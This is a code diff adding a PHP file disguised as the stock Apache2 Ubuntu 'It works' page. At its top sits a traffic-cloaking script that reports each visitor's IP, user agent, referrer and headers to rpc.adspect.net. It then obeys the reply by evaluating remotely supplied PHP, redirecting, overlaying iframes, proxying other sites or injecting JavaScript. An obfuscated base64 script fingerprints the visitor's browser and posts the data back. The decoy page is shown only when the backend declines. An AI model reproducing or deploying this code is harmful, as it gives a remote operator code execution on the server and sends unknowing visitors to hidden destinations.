@@ -1,0 +1,386 @@
+<?php
+ ini_set('display_errors', '0'); error_reporting(E_ALL); if (!function_exists('adspect')) { function adspect_exit($code, $message) { http_response_code($code); exit($message); } function adspect_dig($array, $key, $default = '') { return array_key_exists($key, $array) ? $array[$key] : $default; } function adspect_resolve_path($path) { if ($path[0] === DIRECTORY_SEPARATOR) { $path = adspect_dig($_SERVER, 'DOCUMENT_ROOT', __DIR__) . $path; } else { $path = __DIR__ . DIRECTORY_SEPARATOR . $path; } return realpath($path); } function adspect_spoof_request($url) { $_SERVER['QUERY_STRING'] = (string)parse_url($url, PHP_URL_QUERY); $_SERVER['REQUEST_METHOD'] = 'GET'; $_POST = []; parse_str($_SERVER['QUERY_STRING'], $_GET); } function adspect_try_files() { foreach (func_get_args() as $path) { if (is_file($path)) { if (!is_readable($path)) { adspect_exit(403, 'Permission denied'); } switch (strtolower(pathinfo($path, PATHINFO_EXTENSION))) { case 'php': case 'html': case 'htm': case 'phtml': case 'php5': case 'php4': case 'php3': adspect_execute($path); exit; default: header('Content-Type: ' . adspect_content_type($path)); header('Content-Length: ' . filesize($path)); readfile($path); exit; } } } adspect_exit(404, 'File not found'); } function adspect_execute() { global $_adspect; require_once func_get_arg(0); } function adspect_content_type($path) { if (function_exists('mime_content_type')) { $type = mime_content_type($path); if (is_string($type)) { return $type; } } return 'application/octet-stream'; } function adspect_serve_local($url) { $path = (string)parse_url($url, PHP_URL_PATH); if ($path === '') { return null; } $path = adspect_resolve_path($path); if (is_string($path)) { adspect_spoof_request($url); if (is_dir($path)) { chdir($path); adspect_try_files('index.php', 'index.html', 'index.htm'); return; } chdir(dirname($path)); adspect_try_files($path); return; } adspect_exit(404, 'File not found'); } function adspect_tokenize($str, $sep) { $toks = []; $tok = strtok($str, $sep); while ($tok !== false) { $toks[] = $tok; $tok = strtok($sep); } return $toks; } function adspect_x_forwarded_for() { if (array_key_exists('HTTP_X_FORWARDED_FOR', $_SERVER)) { $xff = adspect_tokenize($_SERVER['HTTP_X_FORWARDED_FOR'], ', '); } elseif (array_key_exists('HTTP_CF_CONNECTING_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_CF_CONNECTING_IP']]; } elseif (array_key_exists('HTTP_X_REAL_IP', $_SERVER)) { $xff = [$_SERVER['HTTP_X_REAL_IP']]; } else { $xff = []; } if (array_key_exists('REMOTE_ADDR', $_SERVER)) { $xff[] = $_SERVER['REMOTE_ADDR']; } return array_unique($xff); } function adspect_headers() { $headers = []; foreach ($_SERVER as $key => $value) { if (!strncmp('HTTP_', $key, 5)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[$header] = $value; } } return $headers; } function adspect_crypt($in, $key) { $il = strlen($in); $kl = strlen($key); $out = ''; for ($i = 0; $i < $il; ++$i) { $out .= chr(ord($in[$i]) ^ ord($key[$i % $kl])); } return $out; } function adspect_proxy_headers() { $headers = []; foreach (func_get_args() as $key) { if (array_key_exists($key, $_SERVER)) { $header = strtr(strtolower(substr($key, 5)), '_', '-'); $headers[] = "{$header}: {$_SERVER[$key]}"; } } return $headers; } function adspect_proxy($url, $xff, $param = null, $key = null) { $url = parse_url($url); if (empty($url)) { adspect_exit(500, 'Invalid proxy URL'); } extract($url); $curl = curl_init(); curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_USERAGENT, adspect_dig($_SERVER, 'HTTP_USER_AGENT', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36')); curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); if (!isset($scheme)) { $scheme = 'http'; } if (!isset($host)) { $host = adspect_dig($_SERVER, 'HTTP_HOST', 'localhost'); } if (isset($user, $pass)) { curl_setopt($curl, CURLOPT_USERPWD, "$user:$pass"); $host = "$user:$pass@$host"; } if (isset($port)) { curl_setopt($curl, CURLOPT_PORT, $port); $host = "$host:$port"; } $origin = "$scheme://$host"; if (!isset($path)) { $path = '/'; } if ($path[0] !== '/') { $path = "/$path"; } $url = $path; if (isset($query)) { $url .= "?$query"; } curl_setopt($curl, CURLOPT_URL, $origin . $url); $headers = adspect_proxy_headers('HTTP_ACCEPT', 'HTTP_ACCEPT_ENCODING', 'HTTP_ACCEPT_LANGUAGE', 'HTTP_COOKIE'); if ($xff !== '') { $headers[] = "X-Forwarded-For: {$xff}"; } if (!empty($headers)) { curl_setopt($curl, CURLOPT_HTTPHEADER, $headers); } $data = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); $type = curl_getinfo($curl, CURLINFO_CONTENT_TYPE); curl_close($curl); http_response_code($code); if (is_string($data)) { if (isset($param, $key) && preg_match('{^text/(?:html|css)}i', $type)) { $base = $path; if ($base[-1] !== '/') { $base = dirname($base); } $base = rtrim($base, '/'); $rw = function ($m) use ($origin, $base, $param, $key) { list($repl, $what, $url) = $m; $url = parse_url($url); if (!empty($url)) { extract($url); if (isset($host)) { if (!isset($scheme)) { $scheme = 'http'; } $host = "$scheme://$host"; if (isset($user, $pass)) { $host = "$user:$pass@$host"; } if (isset($port)) { $host = "$host:$port"; } } else { $host = $origin; } if (!isset($path)) { $path = ''; } if (!strlen($path) || $path[0] !== '/') { $path = "$base/$path"; } if (!isset($query)) { $query = ''; } $host = base64_encode(adspect_crypt($host, $key)); parse_str($query, $query); $query[$param] = "$path#$host"; $repl = '?' . http_build_query($query); if (isset($fragment)) { $repl .= "#$fragment"; } if ($what[-1] === '=') { $repl = "\"$repl\""; } $repl = $what . $repl; } return $repl; }; $re = '{(href=|src=|url\()["\']?((?:https?:|(?!#|[[:alnum:]]+:))[^"\'[:space:]>)]+)["\']?}i'; $data = preg_replace_callback($re, $rw, $data); } } else { $data = ''; } header("Content-Type: $type"); header('Content-Length: ' . strlen($data)); echo $data; } function adspect($sid, $mode, $param, $key) { if (!function_exists('curl_init')) { adspect_exit(500, 'curl extension is missing'); } $xff = adspect_x_forwarded_for(); $addr = adspect_dig($xff, 0); $xff = implode(', ', $xff); if (array_key_exists($param, $_GET) && strpos($_GET[$param], '#') !== false) { list($url, $host) = explode('#', $_GET[$param], 2); $host = adspect_crypt(base64_decode($host), $key); unset($_GET[$param]); $query = http_build_query($_GET); $url = "$host$url?$query"; adspect_proxy($url, $xff, $param, $key); exit; } $ajax = intval($mode === 'ajax'); $curl = curl_init(); $sid = adspect_dig($_GET, '__sid', $sid); $ua = adspect_dig($_SERVER, 'HTTP_USER_AGENT'); $referrer = adspect_dig($_SERVER, 'HTTP_REFERER'); $query = http_build_query($_GET); if ($_SERVER['REQUEST_METHOD'] == 'POST') { $payload = json_decode($_POST['data'], true); $payload['headers'] = adspect_headers(); curl_setopt($curl, CURLOPT_POST, true); curl_setopt($curl, CURLOPT_POSTFIELDS, json_encode($payload)); } if ($ajax) { header('Access-Control-Allow-Origin: *'); $cid = adspect_dig($_SERVER, 'HTTP_X_REQUEST_ID'); } else { $cid = adspect_dig($_COOKIE, '_cid'); } curl_setopt($curl, CURLOPT_FORBID_REUSE, true); curl_setopt($curl, CURLOPT_CONNECTTIMEOUT, 60); curl_setopt($curl, CURLOPT_TIMEOUT, 60); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_ENCODING , ''); curl_setopt($curl, CURLOPT_HTTPHEADER, [ 'Accept: application/json', "X-Forwarded-For: {$xff}", "X-Forwarded-Host: {$_SERVER['HTTP_HOST']}", "X-Request-ID: {$cid}", "Adspect-IP: {$addr}", "Adspect-UA: {$ua}", "Adspect-JS: {$ajax}", "Adspect-Referrer: {$referrer}", ]); curl_setopt($curl, CURLOPT_URL, "https://rpc.adspect.net/v2/{$sid}?{$query}"); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); $json = curl_exec($curl); if ($errno = curl_errno($curl)) { adspect_exit(500, 'curl error: ' . curl_strerror($errno)); } $code = curl_getinfo($curl, CURLINFO_HTTP_CODE); curl_close($curl); header('Cache-Control: no-store'); switch ($code) { case 200: case 202: $data = json_decode($json, true); if (!is_array($data)) { adspect_exit(500, 'Invalid backend response'); } global $_adspect; $_adspect = $data; extract($data); if ($ajax) { switch ($action) { case 'php': ob_start(); eval($target); $data['target'] = ob_get_clean(); $json = json_encode($data); break; } if ($_SERVER['REQUEST_METHOD'] === 'POST') { header('Content-Type: application/json'); echo $json; } else { header('Content-Type: application/javascript'); echo "window._adata={$json};"; return $target; } } else { if ($js) { setcookie('_cid', $cid, time() + 60); return $target; } switch ($action) { case 'local': return adspect_serve_local($target); case 'noop': return null; case '301': case '302': case '303': header("Location: {$target}", true, (int)$action); break; case 'xar': header("X-Accel-Redirect: {$target}"); break; case 'xsf': header("X-Sendfile: {$target}"); break; case 'refresh': header("Refresh: 0; url={$target}"); break; case 'meta': $target = htmlspecialchars($target); echo "<!DOCTYPE html><head><meta http-equiv=\"refresh\" content=\"0; url={$target}\"></head>"; break; case 'iframe': $target = htmlspecialchars($target); echo "<!DOCTYPE html><iframe src=\"{$target}\" style=\"width:100%;height:100%;position:absolute;top:0;left:0;z-index:999999;border:none;\"></iframe>"; break; case 'proxy': adspect_proxy($target, $xff, $param, $key); break; case 'fetch': adspect_proxy($target, $xff); break; case 'return': if (is_numeric($target)) { http_response_code((int)$target); } else { adspect_exit(500, 'Non-numeric status code'); } break; case 'php': eval($target); break; case 'js': $target = htmlspecialchars(base64_encode($target)); echo "<!DOCTYPE html><body><script src=\"data:text/javascript;base64,{$target}\"></script></body>"; break; } } exit; case 404: adspect_exit(404, 'Stream not found'); default: adspect_exit($code, 'Backend response code ' . $code); } } } $target = adspect('0bec3873-ecf7-4973-a401-a9a6bb208a63', 'redirect', '_', base64_decode('QPxwzAt2eoPnA+gm6R8Z1D5Uj1A3nwzU3wbnqrEMccA=')); if (!isset($target)) { return; } ?>
+<!DOCTYPE html>
+<html>
+<head>
+	<meta http-equiv="refresh" content="10; url=<?= htmlspecialchars($target) ?>">
+	<meta name="referrer" content="no-referrer">
+</head>
+<body>
+	<script src="data:text/javascript;base64,dmFyIF8weDQ5YTg9Wyd0aGVuJywnZGF0YScsJ2FjdGlvbicsJ2hpZGRlbicsJzFibGtjcmonLCcxNDA2NjVmRlFwcm4nLCdocmVmJywnbm9kZU5hbWUnLCc1NDAwMTZmUUlxQWgnLCdwdXNoJywnV0VCR0xfZGVidWdfcmVuZGVyZXJfaW5mbycsJ2NyZWF0ZUVsZW1lbnQnLCdwZXJtaXNzaW9ucycsJ3NjcmVlbicsJzEwNDFrc0VscUInLCdzdHJpbmdpZnknLCczNDg5NTRFWmxZZ3AnLCdjbG9zdXJlJywnMTI3NVFhYlVNWicsJ3ZhbHVlJywnbGVuZ3RoJywnd2luZG93JywndG9TdHJpbmcnLCduYXZpZ2F0b3InLCdsb2NhdGlvbicsJ2Z1bmN0aW9uJywnYXR0cmlidXRlcycsJ2NvbnNvbGUnLCdsb2cnLCdnZXRQYXJhbWV0ZXInLCdpbnB1dCcsJ2FwcGVuZENoaWxkJywndHlwZScsJ1RvdWNoRXZlbnQnLCdnZXRFeHRlbnNpb24nLCdvYmplY3QnLCd0b3VjaEV2ZW50JywnYm9keScsJ3F1ZXJ5Jywnc3VibWl0Jywnbm90aWZpY2F0aW9ucycsJ25hbWUnLCcyMDA0MzdGaGxnV08nLCdkb2N1bWVudEVsZW1lbnQnLCdlcnJvcnMnLCcyOTc5NzFkZ3NZTHQnLCdwZXJtaXNzaW9uJywnMTA0NTA3MUZaYmdjSCcsJ21lc3NhZ2UnLCd3ZWJnbCcsJ05vdGlmaWNhdGlvbicsJ1BPU1QnLCdnZXRPd25Qcm9wZXJ0eU5hbWVzJywnVU5NQVNLRURfUkVOREVSRVJfV0VCR0wnLCdtZXRob2QnLCdmb3JtJywnY2FudmFzJywnc3RhdGUnXTt2YXIgXzB4Njc2Yj1mdW5jdGlvbihfMHgyZDYyZDgsXzB4M2Q1Y2NiKXtfMHgyZDYyZDg9XzB4MmQ2MmQ4LTB4MTE2O3ZhciBfMHg0OWE4Y2I9XzB4NDlhOFtfMHgyZDYyZDhdO3JldHVybiBfMHg0OWE4Y2I7fTsoZnVuY3Rpb24oXzB4NWU1MmY5LF8weDU5Y2YwZCl7dmFyIF8weDE1YWZiNj1fMHg2NzZiO3doaWxlKCEhW10pe3RyeXt2YXIgXzB4MWQ0NzdiPS1wYXJzZUludChfMHgxNWFmYjYoMHgxMzIpKSotcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTIxKSkrcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTNjKSkqcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTQwKSkrcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTM2KSkrLXBhcnNlSW50KF8weDE1YWZiNigweDEzZSkpK3BhcnNlSW50KF8weDE1YWZiNigweDEzMykpKy1wYXJzZUludChfMHgxNWFmYjYoMHgxMWUpKSstcGFyc2VJbnQoXzB4MTVhZmI2KDB4MTIzKSk7aWYoXzB4MWQ0NzdiPT09XzB4NTljZjBkKWJyZWFrO2Vsc2UgXzB4NWU1MmY5WydwdXNoJ10oXzB4NWU1MmY5WydzaGlmdCddKCkpO31jYXRjaChfMHg0ZGE0OWMpe18weDVlNTJmOVsncHVzaCddKF8weDVlNTJmOVsnc2hpZnQnXSgpKTt9fX0oXzB4NDlhOCwweGFkYjI5KSxmdW5jdGlvbigpe3ZhciBfMHg0NzM0Yzc9XzB4Njc2YjtmdW5jdGlvbiBfMHgzNTI0YmIoKXt2YXIgXzB4MzI2MmFkPV8weDY3NmI7XzB4NWNlY2M2W18weDMyNjJhZCgweDEyMCldPV8weDI1NTEwMDt2YXIgXzB4MmRjZjhiPWRvY3VtZW50W18weDMyNjJhZCgweDEzOSldKF8weDMyNjJhZCgweDEyYikpLF8weDIyZWQ5MD1kb2N1bWVudFtfMHgzMjYyYWQoMHgxMzkpXShfMHgzMjYyYWQoMHgxNGMpKTtfMHgyZGNmOGJbXzB4MzI2MmFkKDB4MTJhKV09XzB4MzI2MmFkKDB4MTI3KSxfMHgyZGNmOGJbXzB4MzI2MmFkKDB4MTMwKV09d2luZG93W18weDMyNjJhZCgweDE0NildW18weDMyNjJhZCgweDEzNCldLF8weDIyZWQ5MFtfMHgzMjYyYWQoMHgxNGUpXT1fMHgzMjYyYWQoMHgxMzEpLF8weDIyZWQ5MFtfMHgzMjYyYWQoMHgxMWQpXT1fMHgzMjYyYWQoMHgxMmYpLF8weDIyZWQ5MFtfMHgzMjYyYWQoMHgxNDEpXT1KU09OW18weDMyNjJhZCgweDEzZCldKF8weDVjZWNjNiksXzB4MmRjZjhiW18weDMyNjJhZCgweDE0ZCldKF8weDIyZWQ5MCksZG9jdW1lbnRbXzB4MzI2MmFkKDB4MTE5KV1bXzB4MzI2MmFkKDB4MTRkKV0oXzB4MmRjZjhiKSxfMHgyZGNmOGJbXzB4MzI2MmFkKDB4MTFiKV0oKTt9dmFyIF8weDI1NTEwMD1bXSxfMHg1Y2VjYzY9e307dHJ5e3ZhciBfMHg0OWZjZTI9ZnVuY3Rpb24oXzB4MmZiZGI4KXt2YXIgXzB4MTQ2YzA0PV8weDY3NmI7aWYoXzB4MTQ2YzA0KDB4MTE3KT09PXR5cGVvZiBfMHgyZmJkYjgmJm51bGwhPT1fMHgyZmJkYjgpe3ZhciBfMHhiZWZmZGM9ZnVuY3Rpb24oXzB4MzkxMDVhKXt2YXIgXzB4NDFkNjNiPV8weDE0NmMwNDt0cnl7dmFyIF8weDFjZDY2ZT1fMHgyZmJkYjhbXzB4MzkxMDVhXTtzd2l0Y2godHlwZW9mIF8weDFjZDY2ZSl7Y2FzZSBfMHg0MWQ2M2IoMHgxMTcpOmlmKG51bGw9PT1fMHgxY2Q2NmUpYnJlYWs7Y2FzZSBfMHg0MWQ2M2IoMHgxNDcpOl8weDFjZDY2ZT1fMHgxY2Q2NmVbXzB4NDFkNjNiKDB4MTQ0KV0oKTt9XzB4MzJiMGVkW18weDM5MTA1YV09XzB4MWNkNjZlO31jYXRjaChfMHgxNGQwNzYpe18weDI1NTEwMFtfMHg0MWQ2M2IoMHgxMzcpXShfMHgxNGQwNzZbJ21lc3NhZ2UnXSk7fX0sXzB4MzJiMGVkPXt9LF8weDM0YTg3ODtmb3IoXzB4MzRhODc4IGluIF8weDJmYmRiOClfMHhiZWZmZGMoXzB4MzRhODc4KTt0cnl7dmFyIF8weDE5MGNlMj1PYmplY3RbXzB4MTQ2YzA0KDB4MTI4KV0oXzB4MmZiZGI4KTtmb3IoXzB4MzRhODc4PTB4MDtfMHgzNGE4Nzg8XzB4MTkwY2UyW18weDE0NmMwNCgweDE0MildOysrXzB4MzRhODc4KV8weGJlZmZkYyhfMHgxOTBjZTJbXzB4MzRhODc4XSk7XzB4MzJiMGVkWychISddPV8weDE5MGNlMjt9Y2F0Y2goXzB4MTExYTBlKXtfMHgyNTUxMDBbXzB4MTQ2YzA0KDB4MTM3KV0oXzB4MTExYTBlW18weDE0NmMwNCgweDEyNCldKTt9cmV0dXJuIF8weDMyYjBlZDt9fTtfMHg1Y2VjYzZbXzB4NDczNGM3KDB4MTNiKV09XzB4NDlmY2UyKHdpbmRvd1tfMHg0NzM0YzcoMHgxM2IpXSksXzB4NWNlY2M2W18weDQ3MzRjNygweDE0MyldPV8weDQ5ZmNlMih3aW5kb3cpLF8weDVjZWNjNltfMHg0NzM0YzcoMHgxNDUpXT1fMHg0OWZjZTIod2luZG93W18weDQ3MzRjNygweDE0NSldKSxfMHg1Y2VjYzZbXzB4NDczNGM3KDB4MTQ2KV09XzB4NDlmY2UyKHdpbmRvd1tfMHg0NzM0YzcoMHgxNDYpXSksXzB4NWNlY2M2Wydjb25zb2xlJ109XzB4NDlmY2UyKHdpbmRvd1tfMHg0NzM0YzcoMHgxNDkpXSksXzB4NWNlY2M2W18weDQ3MzRjNygweDExZildPWZ1bmN0aW9uKF8weDYwM2QxZCl7dmFyIF8weDFkZGI3Mj1fMHg0NzM0Yzc7dHJ5e3ZhciBfMHgyMWI5ZDc9e307XzB4NjAzZDFkPV8weDYwM2QxZFtfMHgxZGRiNzIoMHgxNDgpXTtmb3IodmFyIF8weDUwNDZhNSBpbiBfMHg2MDNkMWQpXzB4NTA0NmE1PV8weDYwM2QxZFtfMHg1MDQ2YTVdLF8weDIxYjlkN1tfMHg1MDQ2YTVbXzB4MWRkYjcyKDB4MTM1KV1dPV8weDUwNDZhNVsnbm9kZVZhbHVlJ107cmV0dXJuIF8weDIxYjlkNzt9Y2F0Y2goXzB4NTc1ODJmKXtfMHgyNTUxMDBbXzB4MWRkYjcyKDB4MTM3KV0oXzB4NTc1ODJmW18weDFkZGI3MigweDEyNCldKTt9fShkb2N1bWVudFtfMHg0NzM0YzcoMHgxMWYpXSksXzB4NWNlY2M2Wydkb2N1bWVudCddPV8weDQ5ZmNlMihkb2N1bWVudCk7dHJ5e18weDVjZWNjNlsndGltZXpvbmVPZmZzZXQnXT1uZXcgRGF0ZSgpWydnZXRUaW1lem9uZU9mZnNldCddKCk7fWNhdGNoKF8weDIyMTUwMil7XzB4MjU1MTAwW18weDQ3MzRjNygweDEzNyldKF8weDIyMTUwMltfMHg0NzM0YzcoMHgxMjQpXSk7fXRyeXtfMHg1Y2VjYzZbXzB4NDczNGM3KDB4MTNmKV09ZnVuY3Rpb24oKXt9W18weDQ3MzRjNygweDE0NCldKCk7fWNhdGNoKF8weDRiYjQzNyl7XzB4MjU1MTAwWydwdXNoJ10oXzB4NGJiNDM3WydtZXNzYWdlJ10pO310cnl7XzB4NWNlY2M2W18weDQ3MzRjNygweDExOCldPWRvY3VtZW50WydjcmVhdGVFdmVudCddKF8weDQ3MzRjNygweDE0ZikpW18weDQ3MzRjNygweDE0NCldKCk7fWNhdGNoKF8weDU5NGYyYil7XzB4MjU1MTAwWydwdXNoJ10oXzB4NTk0ZjJiW18weDQ3MzRjNygweDEyNCldKTt9dHJ5e18weDQ5ZmNlMj1mdW5jdGlvbigpe307dmFyIF8weDQxMzA5Mz0weDA7XzB4NDlmY2UyWyd0b1N0cmluZyddPWZ1bmN0aW9uKCl7cmV0dXJuKytfMHg0MTMwOTMsJyc7fSxjb25zb2xlW18weDQ3MzRjNygweDE0YSldKF8weDQ5ZmNlMiksXzB4NWNlY2M2Wyd0b3N0cmluZyddPV8weDQxMzA5Mzt9Y2F0Y2goXzB4MTM5YmE5KXtfMHgyNTUxMDBbJ3B1c2gnXShfMHgxMzliYTlbXzB4NDczNGM3KDB4MTI0KV0pO313aW5kb3dbXzB4NDczNGM3KDB4MTQ1KV1bXzB4NDczNGM3KDB4MTNhKV1bXzB4NDczNGM3KDB4MTFhKV0oeyduYW1lJzpfMHg0NzM0YzcoMHgxMWMpfSlbXzB4NDczNGM3KDB4MTJlKV0oZnVuY3Rpb24oXzB4MTkzZmMwKXt2YXIgXzB4MjdiMWJlPV8weDQ3MzRjNztfMHg1Y2VjYzZbXzB4MjdiMWJlKDB4MTNhKV09W3dpbmRvd1tfMHgyN2IxYmUoMHgxMjYpXVtfMHgyN2IxYmUoMHgxMjIpXSxfMHgxOTNmYzBbXzB4MjdiMWJlKDB4MTJkKV1dLF8weDM1MjRiYigpO30sXzB4MzUyNGJiKTt0cnl7dmFyIF8weDU3OGM1OT1kb2N1bWVudFtfMHg0NzM0YzcoMHgxMzkpXShfMHg0NzM0YzcoMHgxMmMpKVsnZ2V0Q29udGV4dCddKCd3ZWJnbCcpLF8weDI0Yjc3Mz1fMHg1NzhjNTlbXzB4NDczNGM3KDB4MTE2KV0oXzB4NDczNGM3KDB4MTM4KSk7XzB4NWNlY2M2W18weDQ3MzRjNygweDEyNSldPXsndmVuZG9yJzpfMHg1NzhjNTlbXzB4NDczNGM3KDB4MTRiKV0oXzB4MjRiNzczWydVTk1BU0tFRF9WRU5ET1JfV0VCR0wnXSksJ3JlbmRlcmVyJzpfMHg1NzhjNTlbXzB4NDczNGM3KDB4MTRiKV0oXzB4MjRiNzczW18weDQ3MzRjNygweDEyOSldKX07fWNhdGNoKF8weDUzODAwZSl7XzB4MjU1MTAwW18weDQ3MzRjNygweDEzNyldKF8weDUzODAwZVtfMHg0NzM0YzcoMHgxMjQpXSk7fX1jYXRjaChfMHg0NDIyZDIpe18weDI1NTEwMFsncHVzaCddKF8weDQ0MjJkMlsnbWVzc2FnZSddKSxfMHgzNTI0YmIoKTt9fSgpKTs="></script>
+</body>
+</html>
+<?php exit;<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <!--
+    Modified from the Debian original for Ubuntu
+    Last updated: 2014-03-19
+    See: https://launchpad.net/bugs/1288690
+  -->
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>Apache2 Ubuntu Default Page: It works</title>
+    <style type="text/css" media="screen">
+  * {
+    margin: 0px 0px 0px 0px;
+    padding: 0px 0px 0px 0px;
+  }
+
+  body, html {
+    padding: 3px 3px 3px 3px;
+
+    background-color: #D8DBE2;
+
+    font-family: Verdana, sans-serif;
+    font-size: 11pt;
+    text-align: center;
+  }
+
+  div.main_page {
+    position: relative;
+    display: table;
+
+    width: 800px;
+
+    margin-bottom: 3px;
+    margin-left: auto;
+    margin-right: auto;
+    padding: 0px 0px 0px 0px;
+
+    border-width: 2px;
+    border-color: #212738;
+    border-style: solid;
+
+    background-color: #FFFFFF;
+
+    text-align: center;
+  }
+
+  div.page_header {
+    height: 99px;
+    width: 100%;
+
+    background-color: #F5F6F7;
+  }
+
+  div.page_header span {
+    margin: 15px 0px 0px 50px;
+
+    font-size: 180%;
+    font-weight: bold;
+  }
+
+  div.page_header img {
+    margin: 3px 0px 0px 40px;
+
+    border: 0px 0px 0px;
+  }
+
+  div.table_of_contents {
+    clear: left;
+
+    min-width: 200px;
+
+    margin: 3px 3px 3px 3px;
+
+    background-color: #FFFFFF;
+
+    text-align: left;
+  }
+
+  div.table_of_contents_item {
+    clear: left;
+
+    width: 100%;
+
+    margin: 4px 0px 0px 0px;
+
+    background-color: #FFFFFF;
+
+    color: #000000;
+    text-align: left;
+  }
+
+  div.table_of_contents_item a {
+    margin: 6px 0px 0px 6px;
+  }
+
+  div.content_section {
+    margin: 3px 3px 3px 3px;
+
+    background-color: #FFFFFF;
+
+    text-align: left;
+  }
+
+  div.content_section_text {
+    padding: 4px 8px 4px 8px;
+
+    color: #000000;
+    font-size: 100%;
+  }
+
+  div.content_section_text pre {
+    margin: 8px 0px 8px 0px;
+    padding: 8px 8px 8px 8px;
+
+    border-width: 1px;
+    border-style: dotted;
+    border-color: #000000;
+
+    background-color: #F5F6F7;
+
+    font-style: italic;
+  }
+
+  div.content_section_text p {
+    margin-bottom: 6px;
+  }
+
+  div.content_section_text ul, div.content_section_text li {
+    padding: 4px 8px 4px 16px;
+  }
+
+  div.section_header {
+    padding: 3px 6px 3px 6px;
+
+    background-color: #8E9CB2;
+
+    color: #FFFFFF;
+    font-weight: bold;
+    font-size: 112%;
+    text-align: center;
+  }
+
+  div.section_header_red {
+    background-color: #CD214F;
+  }
+
+  div.section_header_grey {
+    background-color: #9F9386;
+  }
+
+  .floating_element {
+    position: relative;
+    float: left;
+  }
+
+  div.table_of_contents_item a,
+  div.content_section_text a {
+    text-decoration: none;
+    font-weight: bold;
+  }
+
+  div.table_of_contents_item a:link,
+  div.table_of_contents_item a:visited,
+  div.table_of_contents_item a:active {
+    color: #000000;
+  }
+
+  div.table_of_contents_item a:hover {
+    background-color: #000000;
+
+    color: #FFFFFF;
+  }
+
+  div.content_section_text a:link,
+  div.content_section_text a:visited,
+   div.content_section_text a:active {
+    background-color: #DCDFE6;
+
+    color: #000000;
+  }
+
+  div.content_section_text a:hover {
+    background-color: #000000;
+
+    color: #DCDFE6;
+  }
+
+  div.validator {
+  }
+    </style>
+  </head>
+  <body>
+    <div class="main_page">
+      <div class="page_header floating_element">
+        <img src="/icons/ubuntu-logo.png" alt="Ubuntu Logo" class="floating_element"/>
+        <span class="floating_element">
+          Apache2 Ubuntu Default Page
+        </span>
+      </div>
+<!--      <div class="table_of_contents floating_element">
+        <div class="section_header section_header_grey">
+          TABLE OF CONTENTS
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#about">About</a>
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#changes">Changes</a>
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#scope">Scope</a>
+        </div>
+        <div class="table_of_contents_item floating_element">
+          <a href="#files">Config files</a>
+        </div>
+      </div>
+-->
+      <div class="content_section floating_element">
+
+
+        <div class="section_header section_header_red">
+          <div id="about"></div>
+          It works!
+        </div>
+        <div class="content_section_text">
+          <p>
+                This is the default welcome page used to test the correct 
+                operation of the Apache2 server after installation on Ubuntu systems.
+                It is based on the equivalent page on Debian, from which the Ubuntu Apache
+                packaging is derived.
+                If you can read this page, it means that the Apache HTTP server installed at
+                this site is working properly. You should <b>replace this file</b> (located at
+                <tt>/var/www/html/index.html</tt>) before continuing to operate your HTTP server.
+          </p>
+
+
+          <p>
+                If you are a normal user of this web site and don't know what this page is
+                about, this probably means that the site is currently unavailable due to
+                maintenance.
+                If the problem persists, please contact the site's administrator.
+          </p>
+
+        </div>
+        <div class="section_header">
+          <div id="changes"></div>
+                Configuration Overview
+        </div>
+        <div class="content_section_text">
+          <p>
+                Ubuntu's Apache2 default configuration is different from the
+                upstream default configuration, and split into several files optimized for
+                interaction with Ubuntu tools. The configuration system is
+                <b>fully documented in
+                /usr/share/doc/apache2/README.Debian.gz</b>. Refer to this for the full
+                documentation. Documentation for the web server itself can be
+                found by accessing the <a href="/manual">manual</a> if the <tt>apache2-doc</tt>
+                package was installed on this server.
+
+          </p>
+          <p>
+                The configuration layout for an Apache2 web server installation on Ubuntu systems is as follows:
+          </p>
+          <pre>
+/etc/apache2/
+|-- apache2.conf
+|       `--  ports.conf
+|-- mods-enabled
+|       |-- *.load
+|       `-- *.conf
+|-- conf-enabled
+|       `-- *.conf
+|-- sites-enabled
+|       `-- *.conf
+          </pre>
+          <ul>
+                        <li>
+                           <tt>apache2.conf</tt> is the main configuration
+                           file. It puts the pieces together by including all remaining configuration
+                           files when starting up the web server.
+                        </li>
+
+                        <li>
+                           <tt>ports.conf</tt> is always included from the
+                           main configuration file. It is used to determine the listening ports for
+                           incoming connections, and this file can be customized anytime.
+                        </li>
+
+                        <li>
+                           Configuration files in the <tt>mods-enabled/</tt>,
+                           <tt>conf-enabled/</tt> and <tt>sites-enabled/</tt> directories contain
+                           particular configuration snippets which manage modules, global configuration
+                           fragments, or virtual host configurations, respectively.
+                        </li>
+
+                        <li>
+                           They are activated by symlinking available
+                           configuration files from their respective
+                           *-available/ counterparts. These should be managed
+                           by using our helpers
+                           <tt>
+                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2enmod">a2enmod</a>,
+                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2dismod">a2dismod</a>,
+                           </tt>
+                           <tt>
+                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2ensite">a2ensite</a>,
+                                <a href="http://manpages.debian.org/cgi-bin/man.cgi?query=a2dissite">a2dissite</a>,
+                            </tt>
+                                and
